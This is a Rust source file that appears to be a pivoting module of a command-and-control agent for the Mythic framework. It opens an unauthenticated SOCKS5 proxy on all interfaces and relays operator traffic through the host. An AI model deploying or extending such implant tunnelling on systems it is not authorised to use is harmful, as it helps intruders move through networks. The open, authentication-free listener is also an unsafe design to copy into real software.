// Gerar test
use crate::agent::AgentTask;
use crate::mythic_continued;
use serde::Deserialize;
use std::{
    error::Error,
    net::SocketAddr,
    result::Result,
    sync::{
        atomic::{AtomicBool, Ordering},
        mpsc,
        Arc,
    },
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{lookup_host, TcpListener, TcpStream},
    runtime::Runtime,
};

#[derive(Deserialize)]
struct SocksArgs {
    port: u16,
}

pub fn setup_socks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: SocksArgs = serde_json::from_str(&task.parameters)?;
    let rt = Runtime::new()?;

    rt.block_on(async {
        let listener = TcpListener::bind(("0.0.0.0", args.port)).await?;
        tx.send(mythic_continued!(
            task.id,
            "listening",
            format!("SOCKS5 server listening on 0.0.0.0:{}", args.port)
        ))?;

        let should_exit = Arc::new(AtomicBool::new(false));
        let should_exit_clone = should_exit.clone();

        // Exit handler
        tokio::spawn(async move {
            let _ = rx.recv();
            should_exit_clone.store(true, Ordering::SeqCst);
            let _ = TcpStream::connect(("127.0.0.1", args.port)).await;
        });

        loop {
            if should_exit.load(Ordering::SeqCst) {
                break;
            }

            match listener.accept().await {
                Ok((stream, _)) => {
                    let exit_handle = should_exit.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_socks_client(exit_handle, stream).await {
                            eprintln!("[!] SOCKS error: {}", e);
                        }
                    });
                }
                Err(e) => {
                    eprintln!("[!] Failed to accept connection: {}", e);
                    continue;
                }
            }
        }

        Ok(())
    })
}

async fn handle_socks_client(
    exit_flag: Arc<AtomicBool>,
    mut client: TcpStream,
) -> Result<(), Box<dyn Error>> {
    let mut buf = [0u8; 2];
    client.read_exact(&mut buf).await?;

    if buf[0] != 0x05 {
        return Err("Unsupported SOCKS version".into());
    }

    let nmethods = buf[1] as usize;
    let mut methods = vec![0u8; nmethods];
    client.read_exact(&mut methods).await?;

    client.write_all(&[0x05, 0x00]).await?; // No authentication for the POC, need to modify this in the future 

    let mut req = [0u8; 4];
    client.read_exact(&mut req).await?;

    if req[1] != 0x01 {
        return Err("Only CONNECT command supported".into());
    }

    let dest = match req[3] {
        0x01 => {
            let mut ipv4 = [0u8; 4];
            client.read_exact(&mut ipv4).await?;
            let mut port_buf = [0u8; 2];
            client.read_exact(&mut port_buf).await?;
            let port = u16::from_be_bytes(port_buf);
            let addr = std::net::IpAddr::from(ipv4);
            SocketAddr::new(addr, port)
        }
        0x03 => {
            let mut len = [0u8; 1];
            client.read_exact(&mut len).await?;
            let mut domain = vec![0u8; len[0] as usize];
            client.read_exact(&mut domain).await?;
            let mut port_buf = [0u8; 2];
            client.read_exact(&mut port_buf).await?;
            let port = u16::from_be_bytes(port_buf);
            let domain_str = String::from_utf8(domain)?;
            let mut addrs = lookup_host((domain_str, port)).await?;
            addrs.next().ok_or("Domain resolution failed")?
        }
        _ => return Err("Unsupported address type".into()),
    };

    let mut remote = TcpStream::connect(dest).await?;

    // Send successful reply
    let reply: Vec<u8> = vec![
        0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0,
    ];
    client.write_all(&reply).await?;

    // Forward traffic in both directions
    tokio::spawn(async move {
        let _ = forward_traffic(client, remote).await;
    });

    Ok(())
}

async fn forward_traffic(
    mut a: TcpStream,
    mut b: TcpStream,
) -> Result<(), Box<dyn Error>> {
    let (mut a_read, mut a_write) = a.split();
    let (mut b_read, mut b_write) = b.split();

    let client_to_remote = tokio::io::copy(&mut a_read, &mut b_write);
    let remote_to_client = tokio::io::copy(&mut b_read, &mut a_write);

    tokio::try_join!(client_to_remote, remote_to_client)?;
    Ok(())
}
